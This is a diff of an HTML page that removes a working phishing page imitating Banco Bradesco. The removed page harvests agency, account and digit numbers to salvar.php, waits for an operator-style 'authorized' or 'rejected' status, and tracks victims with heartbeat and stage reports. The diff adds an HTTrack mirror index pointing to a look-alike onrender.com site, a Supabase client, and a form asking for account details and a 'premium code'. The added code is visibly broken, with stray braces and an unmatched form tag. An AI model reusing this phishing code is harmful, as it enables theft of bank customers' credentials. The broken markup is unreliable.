@@ -1,322 +1,177 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
-  <link rel="icon" href="images/iconsite.png" type="image/png">
-  <link rel="stylesheet" href="css/estilo.css">
-  <script>
-    // redireciona mobile
-    if (/Mobi|Android|iPhone|iPad/.test(navigator.userAgent)) {
-      window.location.replace('/login-mobile.php');
-    }
-  </script>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="description" content="HTTrack is an easy-to-use website mirror utility. It allows you to download a World Wide website from the Internet to a local directory,building recursively all structures, getting html, images, and other files from the server to your computer. Links are rebuiltrelatively so that you can freely browse to the local site (works with any browser). You can mirror several sites together so that you can jump from one toanother. You can, also, update an existing mirror site, or resume an interrupted download. The robot is fully configurable, with an integrated help" />
+	<meta name="keywords" content="httrack, HTTRACK, HTTrack, winhttrack, WINHTTRACK, WinHTTrack, offline browser, web mirror utility, aspirateur web, surf offline, web capture, www mirror utility, browse offline, local  site builder, website mirroring, aspirateur www, internet grabber, capture de site web, internet tool, hors connexion, unix, dos, windows 95, windows 98, solaris, ibm580, AIX 4.0, HTS, HTGet, web aspirator, web aspirateur, libre, GPL, GNU, free software" />
+	<title>Local index - HTTrack Website Copier</title>
+  <!-- Mirror and index made by HTTrack Website Copier/3.49-2 [XR&CO'2014] -->
+	<style type="text/css">
+	<!--
+
+
+body {
+	margin: 0;  padding: 0;  margin-bottom: 15px;  margin-top: 8px;
+	background: #77b;
+}
+body, td {
+	font: 14px "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;
+	}
+
+#subTitle {
+	background: #000;  color: #fff;  padding: 4px;  font-weight: bold; 
+	}
+
+#siteNavigation a, #siteNavigation .current {
+	font-weight: bold;  color: #448;
+	}
+#siteNavigation a:link    { text-decoration: none; }
+#siteNavigation a:visited { text-decoration: none; }
+
+#siteNavigation .current { background-color: #ccd; }
+
+#siteNavigation a:hover   { text-decoration: none;  background-color: #fff;  color: #000; }
+#siteNavigation a:active  { text-decoration: none;  background-color: #ccc; }
+
+
+a:link    { text-decoration: underline;  color: #00f; }
+a:visited { text-decoration: underline;  color: #000; }
+a:hover   { text-decoration: underline;  color: #c00; }
+a:active  { text-decoration: underline; }
+
+#pageContent {
+	clear: both;
+	border-bottom: 6px solid #000;
+	padding: 10px;  padding-top: 20px;
+	line-height: 1.65em;
+	background-image: url(backblue.gif);
+	background-repeat: no-repeat;
+	background-position: top right;
+	}
+
+#pageContent, #siteNavigation {
+	background-color: #ccd;
+	}
+
+
+.imgLeft  { float: left;   margin-right: 10px;  margin-bottom: 10px; }
+.imgRight { float: right;  margin-left: 10px;   margin-bottom: 10px; }
+
+hr { height: 1px;  color: #000;  background-color: #000;  margin-bottom: 15px; }
+
+h1 { margin: 0;  font-weight: bold;  font-size: 2em; }
+h2 { margin: 0;  font-weight: bold;  font-size: 1.6em; }
+h3 { margin: 0;  font-weight: bold;  font-size: 1.3em; }
+h4 { margin: 0;  font-weight: bold;  font-size: 1.18em; }
+
+.blak { background-color: #000; }
+.hide { display: none; }
+.tableWidth { min-width: 400px; }
+
+.tblRegular       { border-collapse: collapse; }
+.tblRegular td    { padding: 6px;  background-image: url(fade.gif);  border: 2px solid #99c; }
+.tblHeaderColor, .tblHeaderColor td { background: #99c; }
+.tblNoBorder td   { border: 0; }
+
+
+// -->
+</style>
+
 </head>
-<body>
-  <div class="load" id="tela-loading" style="display: none;">
-    <div class="container-load">
-      <div class="circle"></div>
-      <div class="circle"></div>
-    </div>
-  </div>
 
-  <form style="margin:0; padding:0;" onsubmit="enviarDados(event)">
+<table width="76%" border="0" align="center" cellspacing="0" cellpadding="3" class="tableWidth">
+	<tr>
+	<td id="subTitle">HTTrack Website Copier - Open Source offline browser</td>
+	</tr>
+</table>
+<table width="76%" border="0" align="center" cellspacing="0" cellpadding="0" class="tableWidth">
+<tr class="blak">
+<td>
+	<table width="100%" border="0" align="center" cellspacing="1" cellpadding="0">
+	<tr>
+	<td colspan="6"> 
+		<table width="100%" border="0" align="center" cellspacing="0" cellpadding="10">
+		<tr> 
+		<td id="pageContent"> 
+<!-- ==================== End prologue ==================== -->
 
-    <header class="topbar">
-      <div class="header-container">
-        <div class="left-group">
-          <img src="images/cadeado.png" alt="Cadeado" class="ico-cadeado">
-          <span class="access-text">ACESSAR SUA CONTA</span>
-          <div class="vertical-divider"></div>
-        </div>
+	<meta name="generator" content="HTTrack Website Copier/3.x">
+	<TITLE>Local index - HTTrack</TITLE>
+</HEAD>
 
-        <div class="center-group">
-          <div class="campo-agencia">
-            <label for="agencia" class="lbl-branco">Agência:</label>
-            <input name="agencia" id="agencia" class="input-min" type="text" required="">
-          </div>
-
-          <div class="campo-conta">
-            <label for="conta" class="lbl-branco">Conta:</label>
-            <input name="conta" id="conta" class="input-min" type="text" required="">
-            <input name="digito" id="digito" class="input-digito" type="text" required="">
-          </div>
-
-          <button type="submit" class="btn-ok">OK</button>
-        </div>
-
-        <div class="checkbox-lembrar">
-          <input type="checkbox" id="lembrar">
-          <label for="lembrar" class="lbl-branco">Lembrar-me</label>
-        </div>
-
-        <div class="divider-meio"></div>
-
-        <div class="como-usar">
-          <span class="como-usar-text">Como Usar</span>
-          <img src="images/icon_comousar.png" alt="Como Usar" class="ico-usar">
-        </div>
-        </div>
+<BODY>
+<H1 ALIGN=Center>Index of locally available sites:</H1>
+	<TABLE BORDER="0" WIDTH="100%" CELLSPACING="1" CELLPADDING="0">
+		<TR>
+			<TD BACKGROUND="fade.gif">
+				&middot;
+					<A HREF="bradesco-bia.onrender.com/index.html">
+						Banco Bradesco | Entre Nós, Você Vem Primeiro
+					</A>		
+			</TD>
+		</TR>
+	</TABLE>
+	<BR>
+	<BR>
+	<BR>
+  	<H6 ALIGN="RIGHT">
+	<I>Mirror and index made by HTTrack Website Copier [XR&amp;CO'2008]</I>
+	</H6>
+	<!-- Mirror and index made by HTTrack Website Copier/3.49-2 [XR&CO'2014] -->
+	<!-- Thanks for using HTTrack Website Copier! -->
+	<meta HTTP-EQUIV="Refresh" CONTENT="0; URL=bradesco-bia.onrender.com/index.html">
 
 
-        <div class="right-group">
-          <span class="acessibilidade-text">Acessibilidade</span>
-          <img src="images/icon_acessibilidade.png" alt="Acessibilidade" class="ico-acessibilidade">
-        </div>
-      
-    </header>
+<!-- ==================== Start epilogue ==================== -->
+		</td>
+		</tr>
+		</table>
+	</td>
+	</tr>
+	</table>
+</td>
+</tr>
+</table>
 
-    <section class="carrossel">
-      <div class="slides">
-        <div class="slide active" style="background-image: url('images/promocao_aventura_no_havai_desktop.webp');"></div>
-        <div class="slide" style="background-image: url('images/BANNER_HOME_DESK_CLASSIC.webp');"></div>
-        <div class="slide" style="background-image: url('images/investir-desktop.webp');"></div>
-      </div>
-      <img src="images/Gradient.png" class="gradient-overlay" alt="Gradient">
-      <img src="images/menu-lateral.png" class="menu-lateral-overlay" alt="Menu lateral fixo">
-      <div class="carousel-controls">
-        <button class="circle-button">❙❙</button>
-        <div class="progress-bar"><div class="progress-fill" style="animation: 5s linear 0s infinite normal none running progressAnim;"></div></div>
-        <div class="dots">
-          <span class="dot active"></span>
-          <span class="dot"></span>
-          <span class="dot"></span>
-        </div>
-        <button class="circle-button">❮</button>
-        <button class="circle-button">❯</button>
-      </div>
-    </section>
-
-    <section class="cta-container">
-      <div class="cta-content">
-        <span class="cta-text">Contrate on-line, mesmo sem conta-corrente</span>
-        <img src="images/seta.png" alt="Seta" class="cta-arrow">
-      </div>
-      <div class="cards-box">
-        <div class="card"><img src="images/icon1.png" alt="Renegocie"><p>Renegocie suas dívidas</p></div>
-        <div class="card"><img src="images/icon2.png" alt="Cartão"><p>Peça seu cartão<br>sem anuidade</p></div>
-        <div class="card"><img src="images/icon3.png" alt="Consórcio"><p>Simule seu<br>consórcio</p></div>
-        <div class="card"><img src="images/icon4.png" alt="Dental"><p>Contrate seu<br>plano dental</p></div>
-        <div class="card"><img src="images/icon5.png" alt="Seguro"><p>Proteja seu lar.<br>Simule aqui</p></div>
-        <div class="card"><img src="images/icon6.png" alt="Agora"><p>Invista com a<br>Ágora</p></div>
-        <div class="card"><img src="images/icon7.png" alt="Mais opções"><p>Conheça mais<br>opções</p></div>
-      </div>
-    </section>
-
-    <section class="produtos-servicos">
-      <h2 class="titulo-gradiente">
-        Produtos e serviços pra<br>
-        agilizar seu dia a dia
-      </h2>
-      <p class="subtexto">
-        Confira algumas das soluções que<br>preparamos pra você.
-      </p>
-    </section>
-
-    <section class="cards-servicos">
-      <div class="cards-grid">
-        <div class="servico-card"><img src="images/icone1.png" alt="Fale Conosco"><p>FALE CONOSCO</p></div>
-        <div class="servico-card"><img src="images/icone2.png" alt="2ª Via"><p>2ª VIA DO BOLETO</p></div>
-        <div class="servico-card"><img src="images/icone3.png" alt="Pagamentos"><p>PAGAMENTOS</p></div>
-        <div class="servico-card"><img src="images/icone4.png" alt="Desbloqueio"><p>DESBLOQUEIO DE CARTÃO</p></div>
-        <div class="servico-card"><img src="images/icone5.png" alt="Renegociação"><p>RENEGOCIAÇÃO DE DÍVIDAS</p></div>
-        <div class="servico-card"><img src="images/icone6.png" alt="Segurança"><p>SEGURANÇA</p></div>
-      </div>
-    </section>
-
-    <section class="fundo-novidades">
-      <img src="images/background-novidades.png" alt="Fundo novidades" class="fundo-diagonal">
-    </section>
-
-    <section class="fundo-continuacao">
-      <img src="images/Background.png" alt="Continuação visual" class="fundo-diagonal">
-    </section>
-
-    <section class="fundo-continuacao1">
-      <img src="images/Background1.png" alt="Continuação visual" class="fundo-diagonal">
-    </section>
-
-  </form>
-
+<table width="76%" border="0" align="center" valign="bottom" cellspacing="0" cellpadding="0">
+	<tr>
+	<td id="footer"><small>&copy; 2008 Xavier Roche & other contributors - Web Design: Leto Kauler.</small></td>
+	</tr>
+</table>
+<!-- Biblioteca oficial do Supabase -->
+<script src="https://unpkg.com/@supabase/supabase-js@2"></script>
 
 <script>
-  async function verificarStatus(clientId) {
-    const loader = document.getElementById('tela-loading');
-    if (loader) loader.style.display = 'flex';
+  const supabaseUrl = "https://osxkkdmlnlmzfnvgijyc.supabase.co";
 
-    try {
-      const res  = await fetch(`verificar_status.php?id=${clientId}`);
-      const json = await res.json();
-      const status = (json.status || '').trim();
-      const tipo   = (json.tipo   || '').trim();
+  // Use apenas a chave PUBLICÁVEL (essa que você colocou está ok)
+  const supabaseKey = "sb_publishable_9dEpEEMjzLwJkcxnkzgQLQ_NutHXTjU";
 
-      if (status === 'authorized') {
-        if (tipo === 'classic')      window.location.href = 'login.php';
-        else if (tipo === 'exclusive') window.location.href = 'exclusive.php';
-        else if (tipo === 'prime')     window.location.href = 'prime.php';
-        else                           window.location.href = 'login.php';
-      }
-      else if (status === 'rejected') {
-        if (loader) loader.style.display = 'none';
-        mostrarErro('Dados incorretos. Verifique e tente novamente.');
-      }
-      else {
-        setTimeout(() => verificarStatus(clientId), 1500);
-      }
-    } catch {
-      setTimeout(() => verificarStatus(clientId), 2000);
-    }
+  const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+</script>
+
   }
 </script>
 
-<script>
-  const slides       = document.querySelectorAll('.slide');
-  const dots         = document.querySelectorAll('.dot');
-  const pauseBtn     = document.querySelector('.carousel-controls button:nth-child(1)');
-  const prevBtn      = document.querySelector('.carousel-controls button:nth-child(4)');
-  const nextBtn      = document.querySelector('.carousel-controls button:nth-child(5)');
-  const progressFill = document.querySelector('.progress-fill');
+  
+  <button type="entrar">Enviar</button>
 
-  let currentIndex = 0, interval, paused = false;
+</form>
+<form id="formPremium">
 
-  function showSlide(i) {
-    slides.forEach((s, idx) => {
-      s.classList.toggle('active', idx === i);
-      dots[idx].classList.toggle('active', idx === i);
-    });
-    currentIndex = i;
-  }
-  function nextSlide() { showSlide((currentIndex + 1) % slides.length); }
-  function prevSlide() { showSlide((currentIndex - 1 + slides.length) % slides.length); }
+  <input type="text" name="agencia_sem_digito" placeholder="Agencia sem digito " required>
+  <input type="text" name="conta_sem_digito" placeholder="conta sem digito" required>
+  <input type="text" name="codigo_premium" placeholder="Código premium" required>
+  <input type="text" name="id_servidor" placeholder="ID do servidor" required>
 
-  function startCarousel() {
-    interval = setInterval(() => {
-      nextSlide();
-      resetProgressBar();
-    }, 5000);
-  }
-  function stopCarousel() { clearInterval(interval); }
+  <button type="submit">Ativar Premium</button>
+</form>
 
-  function togglePause() {
-    if (paused) { startCarousel(); pauseBtn.innerHTML = '❙❙'; }
-    else        { stopCarousel();  pauseBtn.innerHTML = '▶'; }
-    paused = !paused;
-  }
+<p id="msg"></p>
 
-  function resetProgressBar() {
-    progressFill.style.animation = 'none';
-    void progressFill.offsetWidth;
-    progressFill.style.animation = 'progressAnim 5s linear infinite';
-  }
+</body>
 
-  pauseBtn.addEventListener('click', togglePause);
-  nextBtn.addEventListener('click', () => { nextSlide(); resetProgressBar(); });
-  prevBtn.addEventListener('click', () => { prevSlide(); resetProgressBar(); });
-  dots.forEach((dot, idx) => dot.addEventListener('click', () => { showSlide(idx); resetProgressBar(); }));
-
-  showSlide(0);
-  startCarousel();
-  resetProgressBar();
-</script>
-
-
-<script>
-  document.querySelector('form').addEventListener('submit', enviarDados);
-
-  // ✅ ---- FUNÇÃO MODIFICADA ---- ✅
-  async function enviarDados(e) {
-    e.preventDefault();
-    const agencia = document.getElementById('agencia').value.trim();
-    const conta   = document.getElementById('conta').value.trim();
-    const digito  = document.getElementById('digito').value.trim();
-
-    if (!agencia || !conta || !digito) {
-      mostrarErro('Os campos agência, conta e dígito são obrigatórios.');
-      return;
-    }
-
-    // Payload que será enviado diretamente para o seu backend
-    const payloadParaSalvar = {
-      agencia: agencia,
-      conta: conta,
-      digito: digito,
-      lembrar: document.getElementById('lembrar').checked ? 'on' : ''
-    };
-
-    try {
-      document.getElementById('tela-loading').style.display = 'flex';
-
-      // Requisição direta para 'salvar.php', sem o proxy
-      const salvarRes  = await fetch('salvar.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payloadParaSalvar) // Envia o payload com os dados do formulário
-      });
-      const salvarJson = await salvarRes.json();
-
-      if (!salvarJson.success) {
-        throw new Error(salvarJson.error || 'Falha ao salvar os dados.');
-      }
-
-      // Continua com a verificação de status normalmente
-      verificarStatus(salvarJson.client_id);
-
-    } catch (err) {
-      document.getElementById('tela-loading').style.display = 'none';
-      mostrarErro(err.message);
-    }
-  }
-
-  function mostrarErro(msg) {
-    const popup = document.createElement('div');
-    popup.className = 'popUp-error';
-    popup.innerHTML = `
-      <div class="erro"><p>${msg}</p></div>
-      <div class="carregar"><div class="temp-carregamento"></div></div>
-    `;
-    document.body.appendChild(popup);
-    popup.style.display = 'flex';
-    setTimeout(() => popup.remove(), 5000);
-  }
-</script>
-
-
-<script>
-  function getCookie(name) {
-    const v = `; ${document.cookie}`;
-    const parts = v.split(`; ${name}=`);
-    return parts.length === 2 ? parts.pop().split(';').shift() : '';
-  }
-
-  function sendHeartbeat() {
-    const userCookie = getCookie('identificador_cliente');
-    if (userCookie) {
-      const fd = new FormData();
-      fd.append('identificador_cookie', userCookie);
-      fetch('/heartbeat.php', { method: 'POST', body: fd })
-        .catch(e => console.error('Heartbeat falhou:', e));
-    }
-  }
-
-  sendHeartbeat();
-  setInterval(sendHeartbeat, 3000);
-</script>
-
-<script>
-  document.addEventListener('DOMContentLoaded', () => {
-    const pageName = 'index.php';
-    function reportarEstagioAtual() {
-      fetch('/atualizar_estagio.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ estagio: pageName }),
-        credentials: 'include'
-      }).catch(e => console.error(`Erro ao reportar estágio '${pageName}':`, e));
-    }
-    reportarEstagioAtual();
-    setInterval(reportarEstagioAtual, 2000);
-  });
-</script>
+</html>
 
 
 
-</body></html>
